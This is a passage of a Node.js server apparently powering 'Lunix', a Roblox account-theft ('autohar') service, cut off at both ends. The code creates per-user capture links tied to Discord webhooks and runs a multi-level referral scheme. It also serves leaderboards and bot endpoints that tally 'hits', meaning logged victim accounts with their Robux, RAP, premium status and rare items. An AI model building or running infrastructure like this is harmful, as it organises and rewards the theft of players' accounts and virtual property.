    // Create new directory entry — store discordId for OAuth login
    const authToken = crypto.randomBytes(32).toString('hex');
    directories[directoryName] = {
      webhookUrl: webhookUrl,
      serviceType: serviceType || 'single',
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      authToken: authToken,
      uniqueId: uniqueId,
      discordId: pendingSession.discordId,
      discordUsername: pendingSession.discordUsername,
      discordAvatar: pendingSession.discordAvatar,
      filters: {
        enabled: false,
        currency: { enabled: false, type: 'balance', value: 0 },
        collectibles: { enabled: false, type: 'rap', value: 0 },
        billings: { enabled: false, type: 'summary', value: 0 },
        creditBalance: { enabled: false, value: 0 },
        groups: { enabled: false, type: 'balance', value: 0 },
        premium: { enabled: false },
        korblox: { enabled: false },
        headless: { enabled: false }
      },
      // Infinite hook fields
      referralCode: userReferralCode,      // Their unique referral code (null for non-infinite)
      referredBy: referredBy,              // Who referred them (null if main site)
      referralChain: referralChain         // Full upline chain
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }

    // Consume pending session — clear cookie and delete from DB
    await deletePendingSession(pendingToken);
    res.clearCookie('pending_session');

    // Issue a full session cookie now that the directory is created
    const sessionToken = await createSession(
      pendingSession.discordId,
      pendingSession.discordUsername,
      pendingSession.discordAvatar
    );
    res.cookie('session', sessionToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: SESSION_TTL_MS
    });



    // Send notification to the webhook about successful directory creation with auth token
    try {
      // Build links
const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
const autoharLink = `${proto}://${req.get('host')}/u/${directoryName}`;
const dashboardLink = `${proto}://${req.get('host')}/dashboard`;

// Description with inline clickable links
let title;
let description;

if (serviceType === 'infinite') {
  const referralLink = `${proto}://${req.get('host')}/create?ref=${userReferralCode}`;
  title = 'Infinite System';
  description =
    `[**DASHBOARD URL**](${dashboardLink}) | ` +
    `[**AUTOHAR LINK**](${autoharLink}) | ` +
    `[**REFERRAL URL**](${referralLink})\n\n` +
    `Thank you for Choosing Lunix`;
} else {
  title = 'Normal System';
  description =
    `[**DASHBOARD URL**](${dashboardLink}) | ` +
    `[**AUTOHAR LINK**](${autoharLink})\n\n` +
    `Thank you for Choosing Lunix`;
}

// Fields (ID + Discord login info — no raw token)
const fields = [];

const notificationPayload = {
  embeds: [{
    title: title,
    description: description,
    color: 0xFFFFFF
  }]
};

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(notificationPayload)
      });


    } catch (webhookError) {
    // Log webhook errors without exposing URLs
    console.error('❌ Webhook notification failed:', webhookError.message);
  }

    res.json({ 
      success: true, 
      directoryName: directoryName,
      apiToken: directories[directoryName].apiToken,
      authToken: authToken,
      uniqueId: directories[directoryName].uniqueId,
      referralCode: userReferralCode,  // Include referral code for infinite users
      serviceType: serviceType
    });

  } catch (error) {
    console.error('Error creating directory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Serve the site owner index page
app.get('/u/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve login page
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve redeem page
app.get('/redeem/auth-token', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'redeem.html'));
});

// Serve dashboard page
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ─── Transfer Token Routes ─────────────────────────────────────────────────────
const TRANSFER_TOKEN_TTL_MS = 30 * 24 * 60 * 60 * 1000; // 30 days

// Generate a transfer token for the authenticated user
app.post('/api/generate-transfer-token', requireSession, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: 'Database not available' });

    const directories = await loadDirectories();
    let userDirName = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirName = dirName;
        break;
      }
    }
    if (!userDirName) return res.status(404).json({ error: 'Directory not found' });

    // Delete any existing token for this directory
    const existingSnap = await db.ref('transfer_tokens').orderByChild('directoryName').equalTo(userDirName).once('value');
    if (existingSnap.exists()) {
      const updates = {};
      existingSnap.forEach(child => { updates[child.key] = null; });
      await db.ref('transfer_tokens').update(updates);
    }

    // Generate new 64-char hex token (32 bytes)
    const token = crypto.randomBytes(32).toString('hex');
    const now = Date.now();
    const expiresAt = now + TRANSFER_TOKEN_TTL_MS;

    await db.ref(`transfer_tokens/${token}`).set({
      directoryName: userDirName,
      createdAt: now,
      expiresAt
    });

    res.json({
      success: true,
      token,
      createdAt: now,
      expiresAt
    });
  } catch (error) {
    console.error('Error generating transfer token:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get active transfer token info (no token value, just metadata)
app.get('/api/transfer-token-info', requireSession, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: 'Database not available' });

    const directories = await loadDirectories();
    let userDirName = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirName = dirName;
        break;
      }
    }
    if (!userDirName) return res.status(404).json({ error: 'Directory not found' });

    const snap = await db.ref('transfer_tokens').orderByChild('directoryName').equalTo(userDirName).once('value');
    if (!snap.exists()) return res.json({ hasToken: false });

    let tokenData = null;
    snap.forEach(child => { tokenData = child.val(); });

    if (Date.now() > tokenData.expiresAt) {
      // Expired — clean up
      const updates = {};
      snap.forEach(child => { updates[child.key] = null; });
      await db.ref('transfer_tokens').update(updates);
      return res.json({ hasToken: false });
    }

    res.json({
      hasToken: true,
      createdAt: tokenData.createdAt,
      expiresAt: tokenData.expiresAt
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Validate a transfer token (used by redeem page before Discord auth)
app.get('/api/validate-transfer-token', async (req, res) => {
  try {
    const { token } = req.query;
    if (!token) return res.status(400).json({ error: 'Token required' });

    if (!db) return res.status(503).json({ error: 'Database not available' });

    const snap = await db.ref(`transfer_tokens/${token}`).once('value');
    if (!snap.exists()) return res.status(404).json({ error: 'Invalid token' });

    const data = snap.val();
    if (Date.now() > data.expiresAt) {
      await db.ref(`transfer_tokens/${token}`).remove();
      return res.status(410).json({ error: 'Token expired' });
    }

    res.json({ valid: true, directoryName: data.directoryName });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Redeem a transfer token — swap Discord account on the directory
app.post('/api/redeem-transfer-token', async (req, res) => {
  try {
    const { token, code } = req.body;
    if (!token || !code) return res.status(400).json({ error: 'Token and Discord code required' });

    if (!db) return res.status(503).json({ error: 'Database not available' });

    // Validate token
    const snap = await db.ref(`transfer_tokens/${token}`).once('value');
    if (!snap.exists()) return res.status(404).json({ error: 'Invalid token' });

    const tokenData = snap.val();
    if (Date.now() > tokenData.expiresAt) {
      await db.ref(`transfer_tokens/${token}`).remove();
      return res.status(410).json({ error: 'Token expired' });
    }

    // Exchange Discord OAuth code for user info
    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: process.env.DISCORD_REDIRECT_URI_REDEEM || DISCORD_REDIRECT_URI
      })
    });

    if (!tokenResponse.ok) return res.status(400).json({ error: 'Discord auth failed' });

    const tokenResult = await tokenResponse.json();
    const userResponse = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${tokenResult.access_token}` }
    });

    if (!userResponse.ok) return res.status(400).json({ error: 'Failed to fetch Discord user' });

    const newDiscordUser = await userResponse.json();
    const { id: newDiscordId, username: newDiscordUsername, avatar: newDiscordAvatar } = newDiscordUser;

    // Make sure new Discord account doesn't already own a directory
    const directories = await loadDirectories();
    const alreadyOwns = Object.values(directories).some(d => d.discordId === newDiscordId);
    if (alreadyOwns) return res.status(409).json({ error: 'This Discord account already owns a directory' });

    // Swap the Discord account on the directory
    await db.ref(`directories/${tokenData.directoryName}`).update({
      discordId: newDiscordId,
      discordUsername: newDiscordUsername,
      discordAvatar: newDiscordAvatar || null
    });

    // Delete the used token
    await db.ref(`transfer_tokens/${token}`).remove();

    // Create a new session for the new Discord account
    const sessionToken = await createSession(newDiscordId, newDiscordUsername, newDiscordAvatar);

    res.json({ success: true, sessionToken });
  } catch (error) {
    console.error('Error redeeming transfer token:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public endpoint — returns Discord client ID for building OAuth URLs on frontend
app.get('/api/config/discord-client-id', (req, res) => {
  res.json({ clientId: DISCORD_CLIENT_ID, redeemRedirectUri: DISCORD_REDIRECT_URI_REDEEM });
});

// API endpoint: check current session (used by dashboard on load)
app.get('/api/session', async (req, res) => {
  const token = req.cookies?.session;
  const session = await getSession(token);
  if (!session) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // Find which directory this Discord ID owns
  const directories = await loadDirectories();
  let foundDirectory = null;

  for (const [dirName, dirConfig] of Object.entries(directories)) {
    if (dirConfig.discordId === session.discordId) {
      foundDirectory = dirName;
      break;
    }
  }

  res.json({
    discordId: session.discordId,
    discordUsername: session.discordUsername,
    discordAvatar: session.discordAvatar,
    directoryName: foundDirectory
  });
});

// Middleware to authenticate dashboard API requests via session cookie
async function authenticateUser(req, res, next) {
  const token = req.cookies?.session;
  const session = await getSession(token);
  if (!session) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // Find the directory owned by this Discord user
  const directories = await loadDirectories();
  let userDirectory = null;
  let directoryConfig = null;

  for (const [dirName, dirConfig] of Object.entries(directories)) {
    if (dirConfig.discordId === session.discordId) {
      userDirectory = dirName;
      directoryConfig = dirConfig;
      break;
    }
  }

  if (!userDirectory) {
    return res.status(401).json({ error: 'No directory linked to this account' });
  }

  req.session = session;
  req.sessionToken = token;
  req.userDirectory = userDirectory;
  req.directoryConfig = directoryConfig;
  // Keep req.userToken as the directory's internal apiToken for any code that still reads it
  req.userToken = directoryConfig.authToken;
  next();
}

// API endpoint to get directory filters for authenticated users


// API endpoint to get user statistics
app.get('/api/user-stats', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;

    // Find user's directory (main directories only)
    const directories = await loadDirectories();
    let userDirectory = null;
    let uniqueId = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        uniqueId = dirConfig.uniqueId;
        break;
      }
    }

    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this directory only (no subdirectories)
    const userLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;
      return log.context.directory === userDirectory && !log.context.subdirectory;
    });

    // PH timezone helper
    const PH_TZ = 'Asia/Manila';
    const toPhDateStr = (ts) => new Date(ts).toLocaleDateString('en-CA', { timeZone: PH_TZ });

    const todayPh = toPhDateStr(Date.now());
    const todayLogs = userLogs.filter(log => {
      return toPhDateStr(log.timestamp) === todayPh;
    });

    // Calculate statistics
    const totalAccounts = userLogs.length;
    const totalSummary = userLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = userLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = userLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    res.json({
      totalAccounts,
      totalSummary,
      totalRobux,
      totalRAP,
      todayAccounts,
      todaySummary,
      todayRobux,
      todayRAP,
      uniqueId,
      directory: userDirectory
    });

  } catch (error) {
    console.error('Error getting user stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get global leaderboards
app.get('/api/leaderboard', async (req, res) => {
  try {
    if (!db) {
      return res.json([]);
    }

    const directories = await loadDirectories();
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Build totalNetwork count per directory using referredBy
    function countDownline(parentName) {
      let count = 0;
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.referredBy === parentName) {
          count++;
          count += countDownline(dirName);
        }
      }
      return count;
    }

    // Map discordId -> directoryName for network lookup
    const discordToDir = {};
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId) discordToDir[dirConfig.discordId] = dirName;
    }

    // Group logs by directory owner (Discord user)
    const userStats = {};

    Object.values(allLogs).forEach(log => {
      if (!log.context || !log.context.directory) return;

      const directory = log.context.directory;
      const dirConfig = directories[directory];
      
      if (!dirConfig || !dirConfig.discordId) return;

      const userId = dirConfig.discordId;

      if (!userStats[userId]) {
        userStats[userId] = {
          discordId: dirConfig.discordId,
          discordUsername: dirConfig.harName || dirConfig.discordUsername || 'Unknown User',
          discordAvatar: dirConfig.discordAvatar || null,
          totalHits: 0,
          totalSummary: 0,
          totalRobux: 0,
          totalRAP: 0,
          totalNetwork: countDownline(directory)
        };
      }

      userStats[userId].totalHits++;
      if (log.userData) {
        userStats[userId].totalSummary += log.userData.summary || 0;
        userStats[userId].totalRobux += log.userData.robux || 0;
        userStats[userId].totalRAP += log.userData.rap || 0;
      }
    });

    // Convert to array and sort by total summary
    const leaderboard = Object.values(userStats)
      .sort((a, b) => b.totalSummary - a.totalSummary);
    res.json(leaderboard);
  } catch (error) {
    console.error('Error getting leaderboard:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get recent hits with full details (NEW - for redesigned dashboard)
app.get('/api/hits/recent', requireSession, async (req, res) => {
  try {
    if (!db) {
      return res.json([]);
    }

    const limit = Math.min(parseInt(req.query.limit) || 20, 50); // cap at 50
    const directories = await loadDirectories();

    // Get recent logs from Firebase
    const logsRef = db.ref('user_logs');
    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(limit);
    const snapshot = await recentLogsQuery.once('value');
    const recentLogs = [];

    snapshot.forEach(childSnapshot => {
      recentLogs.push({
        key: childSnapshot.key,
        ...childSnapshot.val()
      });
    });

    // Format for display with hitter info
    const liveHits = recentLogs
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .map(log => {
        const directory = log.context?.directory;
        const dirConfig = directories[directory];
        
        return {
          robloxUsername: log.userData?.username || 'Unknown',
          robloxUserId: log.userData?.userId || '0',
          robloxAvatarUrl: log.avatarUrl || null,  // Add stored avatar URL
          robux: log.userData?.robux || 0,
          rap: log.userData?.rap || 0,
          summary: log.userData?.summary || 0,
          timestamp: log.timestamp,
          hitterName: dirConfig?.harName || dirConfig?.discordUsername || directory || 'Unknown',
          hitterId: dirConfig?.discordId || '0',
          hitterAvatar: dirConfig?.discordId && dirConfig?.discordAvatar
            ? `https://cdn.discordapp.com/avatars/${dirConfig.discordId}/${dirConfig.discordAvatar}.png`
            : 'https://cdn.discordapp.com/embed/avatars/0.png'
        };
      });

    res.json(liveHits);
  } catch (error) {
    console.error('Error getting recent hits:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get live hits (OLD - kept for backwards compatibility)
app.get('/api/live-hits', requireSession, async (req, res) => {
  try {
    // Get recent logs from Firebase
    const logsRef = db.ref('user_logs');
    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(20);
    const snapshot = await recentLogsQuery.once('value');
    const recentLogs = snapshot.val() || {};

    // Format for display
    const liveHits = Object.values(recentLogs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, 5)
      .map(log => ({
        username: log.userData.username || log.context?.directory || 'Unknown',
        timestamp: log.timestamp
      }));

    res.json(liveHits);

  } catch (error) {
    console.error('Error getting live hits:', error);
    res.status(500).json({ error: 'Server error' });
  }
});


// API endpoint for daily top hitters leaderboard (for Discord bot)
app.get('/api/bot/leaderboard', async (req, res) => {
  try {
    if (!db) return res.json([]);

    const limit = Math.min(parseInt(req.query.limit) || 3, 10);

    const directories = await loadDirectories();
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // PH timezone — today's date string
    const PH_TZ = 'Asia/Manila';
    const toPhDateStr = (ts) => new Date(ts).toLocaleDateString('en-CA', { timeZone: PH_TZ });
    const todayPh = toPhDateStr(Date.now());

    // Filter only today's logs
    const todayLogs = Object.values(allLogs).filter(log => {
      if (!log.context || !log.context.directory) return false;
      return toPhDateStr(log.timestamp) === todayPh;
    });

    // Group by directory owner
    const userStats = {};

    todayLogs.forEach(log => {
      const directory = log.context.directory;
      const dirConfig = directories[directory];
      if (!dirConfig || !dirConfig.discordId) return;

      const userId = dirConfig.discordId;

      if (!userStats[userId]) {
        const dirStats = dirConfig.stats || {};
        userStats[userId] = {
          discordId: dirConfig.discordId,
          displayName: dirConfig.harName || dirConfig.discordUsername || 'Unknown',
          discordAvatar: dirConfig.discordAvatar || null,
          todayHits: 0,
          todayRobux: 0,
          todayRAP: 0,
          todaySummary: 0,
          lastHitUser: dirStats.lastHitUser || null,
          date: todayPh
        };
      }

      userStats[userId].todayHits++;
      if (log.userData) {
        userStats[userId].todayRobux += log.userData.robux || 0;
        userStats[userId].todayRAP += log.userData.rap || 0;
        userStats[userId].todaySummary += log.userData.summary || 0;
        // Track most recent today's hit username
        if (!userStats[userId].lastTimestamp || log.timestamp > userStats[userId].lastTimestamp) {
          userStats[userId].lastHitUser = log.userData.username || 'Unknown';
          userStats[userId].lastTimestamp = log.timestamp;
        }
      }
    });

    // Sort by today hits descending, take top N
    const leaderboard = Object.values(userStats)
      .sort((a, b) => b.todayHits - a.todayHits)
      .slice(0, limit);
    res.json(leaderboard);

  } catch (error) {
    console.error('Error getting daily leaderboard:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public API endpoint for bots to get directory stats by unique ID
app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
  try {
    const uniqueId = req.params.uniqueId;

    // Load directories to find the one with this unique ID
    const directories = await loadDirectories();

    let targetDirectory = null;
    let targetDirectoryName = null;
    let isSubdirectory = false;

    // Search through all directories and subdirectories for the unique ID
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.uniqueId === uniqueId) {
        targetDirectory = dirName;
        targetDirectoryName = dirName;
        break;
      }

      // Check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.uniqueId === uniqueId) {
            targetDirectory = `${dirName}/${subName}`;
            targetDirectoryName = subName;
            isSubdirectory = true;
            break;
          }
        }
      }

      if (targetDirectory) break;
    }

    if (!targetDirectory) {
      return res.status(404).json({ 
        error: 'Directory not found',
        uniqueId: uniqueId
      });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific directory
    const directoryLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For direct directory matches
      if (log.context.directory === targetDirectory) return true;

      // For subdirectory matches
      if (log.context.subdirectory && 
          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
        return true;
      }

      return false;
    });

    // PH timezone helper
    const PH_TZ = 'Asia/Manila';
    const toPhDateStr = (ts) => new Date(ts).toLocaleDateString('en-CA', { timeZone: PH_TZ });

    const todayPh = toPhDateStr(Date.now());
    const todayLogs = directoryLogs.filter(log => {
      return toPhDateStr(log.timestamp) === todayPh;
    });

    // Calculate statistics
    const totalAccounts = directoryLogs.length;
    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    // Get last hit info
    const lastHit = directoryLogs.length > 0 
      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
      : null;

    const statsResult1 = {
      uniqueId: uniqueId,
      directory: targetDirectoryName,
      fullPath: targetDirectory,
      isSubdirectory: isSubdirectory,
      stats: {
        totalAccounts,
        totalSummary,
        totalRobux,
        totalRAP,
        todayAccounts,
        todaySummary,
        todayRobux,
        todayRAP
      },
      lastHit: lastHit ? {
        username: lastHit.userData.username || 'Unknown',
        timestamp: lastHit.timestamp,
        robux: lastHit.userData.robux || 0,
        premium: lastHit.userData.premium || false
      } : null
    };
    res.json(statsResult1);

  } catch (error) {
    console.error('Error getting bot stats by ID:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Discord ID-based bot stats endpoint — reads from stats field only
app.get('/api/bot/stats/discord/:discordId', async (req, res) => {
  try {
    const discordId = req.params.discordId;

    // Load directories
    const directories = await loadDirectories();

    // Find directory for this Discord ID
    let dirName = null;
    let dirConfig = null;
    for (const [name, config] of Object.entries(directories)) {
      if (config.discordId === discordId) {
        dirName = name;
        dirConfig = config;
        break;
      }
    }

    if (!dirName) {
      return res.status(404).json({ error: 'No directory found for this Discord account', discordId });
    }

    const s = dirConfig.stats || {};

    // Check if today stats are still fresh (same PH date)
    const PH_TZ = 'Asia/Manila';
    const todayPh = new Date().toLocaleDateString('en-CA', { timeZone: PH_TZ });
    const statsDateFresh = s.todayDate === todayPh;

    const result = {
      discordId,
      discordUsername: dirConfig.harName || dirConfig.discordUsername,
      directory: dirName,
      serviceType: dirConfig.serviceType || 'single',
      todayStats: {
        hits: statsDateFresh ? (s.todayHits || 0) : 0,
        summary: statsDateFresh ? (s.todaySummary || 0) : 0,
        rap: statsDateFresh ? (s.todayRAP || 0) : 0,
        robux: statsDateFresh ? (s.todayRobux || 0) : 0
      },
      biggestHits: {
        summary: s.biggest?.summary || 0,
        rap: s.biggest?.rap || 0,
        robux: s.biggest?.robux || 0
      },
      totalStats: {
        hits: s.totalHits || 0,
        summary: s.totalSummary || 0,
        rap: s.totalRAP || 0,
        robux: s.totalRobux || 0
      },
      lastHit: s.lastHitAt ? { user: s.lastHitUser || 'Unknown', timestamp: s.lastHitAt } : null,
      networkStats: {
        directReferrals: s.network?.directReferrals || 0,
        totalNetwork: s.network?.totalNetwork || 0,
        referralCode: s.network?.referralCode || null
      }
    };
    res.json(result);

  } catch (error) {
    console.error('Error fetching bot stats by Discord ID:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public API endpoint for bots to get directory stats
app.get('/api/bot/stats/:directory', async (req, res) => {
  try {
    const directoryName = req.params.directory;

    // Load directories to verify the directory exists
    const directories = await loadDirectories();

    // Check if directory exists (including subdirectories)
    let directoryExists = false;
    let targetDirectory = directoryName;

    if (directories[directoryName]) {
      directoryExists = true;
    } else {
      // Check if it's a subdirectory format (parent/sub)
      const parts = directoryName.split('/');
      if (parts.length === 2) {
        const [parentDir, subDir] = parts;
        if (directories[parentDir] && 
            directories[parentDir].subdirectories && 
            directories[parentDir].subdirectories[subDir]) {
          directoryExists = true;
          targetDirectory = directoryName;
        }
      }
    }

    if (!directoryExists) {
      return res.status(404).json({ 
        error: 'Directory not found',
        directory: directoryName
      });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific directory
    const directoryLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For direct directory matches
      if (log.context.directory === targetDirectory) return true;

      // For subdirectory matches
      if (log.context.subdirectory && 
          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
        return true;
      }

      return false;
    });

    // PH timezone helper
    const PH_TZ = 'Asia/Manila';
    const toPhDateStr = (ts) => new Date(ts).toLocaleDateString('en-CA', { timeZone: PH_TZ });

    const todayPh = toPhDateStr(Date.now());
    const todayLogs = directoryLogs.filter(log => {
      return toPhDateStr(log.timestamp) === todayPh;
    });

    // Calculate statistics
    const totalAccounts = directoryLogs.length;
    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    // Get last hit info
    const lastHit = directoryLogs.length > 0 
      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
      : null;

    const statsResult3 = {
      directory: targetDirectory,
      stats: {
        totalAccounts,
        totalSummary,
        totalRobux,
        totalRAP,
        todayAccounts,
        todaySummary,
        todayRobux,
        todayRAP
      },
      lastHit: lastHit ? {
        username: lastHit.userData.username || 'Unknown',
        timestamp: lastHit.timestamp,
        robux: lastHit.userData.robux || 0,
        premium: lastHit.userData.premium || false
      } : null
    };
    res.json(statsResult3);

  } catch (error) {
    console.error('Error getting bot stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});


// ─── One-time Migration Endpoint ──────────────────────────────────────────────
app.post('/api/admin/migrate-stats', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: 'Database not available' });

    // Check if migration already done
    const migrationSnap = await db.ref('migrationDone').once('value');
    if (migrationSnap.val() === true) {
      return res.status(400).json({ error: 'Migration already completed. Cannot run again.' });
    }

    const directories = await loadDirectories();
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    const PH_TZ = 'Asia/Manila';
    const toPhDateStr = (ts) => new Date(ts).toLocaleDateString('en-CA', { timeZone: PH_TZ });
    const todayPh = toPhDateStr(Date.now());

    function countDownline(parentName) {
      let count = 0;
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.referredBy === parentName) {
          count++;
          count += countDownline(dirName);
        }
      }
      return count;
    }

    const results = {};

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      // Filter logs for this directory
      const dirLogs = Object.values(allLogs).filter(log =>
        log.context?.directory === dirName
      );

      const todayLogs = dirLogs.filter(log => toPhDateStr(log.timestamp) === todayPh);

      // Calculate totals
      const totalHits = dirLogs.length;
      const totalRobux = dirLogs.reduce((s, l) => s + (l.userData?.robux || 0), 0);
      const totalRAP = dirLogs.reduce((s, l) => s + (l.userData?.rap || 0), 0);
      const totalSummary = dirLogs.reduce((s, l) => s + (l.userData?.summary || 0), 0);

      // Today
      const todayHits = todayLogs.length;
      const todayRobux = todayLogs.reduce((s, l) => s + (l.userData?.robux || 0), 0);
      const todayRAP = todayLogs.reduce((s, l) => s + (l.userData?.rap || 0), 0);
      const todaySummary = todayLogs.reduce((s, l) => s + (l.userData?.summary || 0), 0);

      // Biggest hits
      const biggestRobux = dirLogs.length > 0 ? Math.max(...dirLogs.map(l => l.userData?.robux || 0)) : 0;
      const biggestRAP = dirLogs.length > 0 ? Math.max(...dirLogs.map(l => l.userData?.rap || 0)) : 0;
      const biggestSummary = dirLogs.length > 0 ? Math.max(...dirLogs.map(l => l.userData?.summary || 0)) : 0;

      // Last hit
      const sorted = dirLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      const lastHit = sorted[0] || null;

      // Network
      let directReferrals = 0;
      for (const [dn, dc] of Object.entries(directories)) {
        if (dc.referredBy === dirName) directReferrals++;
      }
      const totalNetwork = countDownline(dirName);

      const statsData = {
        totalHits,
        totalRobux,
        totalRAP,
        totalSummary,
        todayHits,
        todayRobux,
        todayRAP,
        todaySummary,
        todayDate: todayPh,
        lastHitAt: lastHit?.timestamp || null,
        lastHitUser: lastHit?.userData?.username || null,
        biggest: {
          robux: biggestRobux,
          rap: biggestRAP,
          summary: biggestSummary
        },
        network: {
          directReferrals,
          totalNetwork,
          referralCode: dirConfig.referralCode || null
        }
      };

      await db.ref(`directories/${dirName}/stats`).set(statsData);
      results[dirName] = { totalHits, totalSummary };
    }

    // Set migration flag — can never run again
    await db.ref('migrationDone').set(true);

    res.json({
      success: true,
      message: 'Migration complete. This endpoint is now permanently disabled.',
      directoriesMigrated: Object.keys(results).length,
      results
    });

  } catch (error) {
    console.error('❌ Migration error:', error.message);
    res.status(500).json({ error: 'Migration failed', details: error.message });
  }
});
// ──────────────────────────────────────────────────────────────────────────────

// API endpoint for admin stats (protected)
app.get('/api/admin/stats', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    const logs = Object.values(allLogs);

    // Calculate all-time stats (not just today)
    const totalUsers = logs.length;
    const totalRobux = logs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalSummary = logs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const premiumUsers = logs.filter(log => log.userData.premium).length;

    // Count unique directories from all logs
    const directories = new Set(logs.map(log => log.context?.directory).filter(dir => dir));
    const activeDirectories = directories.size;

    res.json({
      totalUsers,
      totalRobux,
      totalSummary,
      premiumUsers,
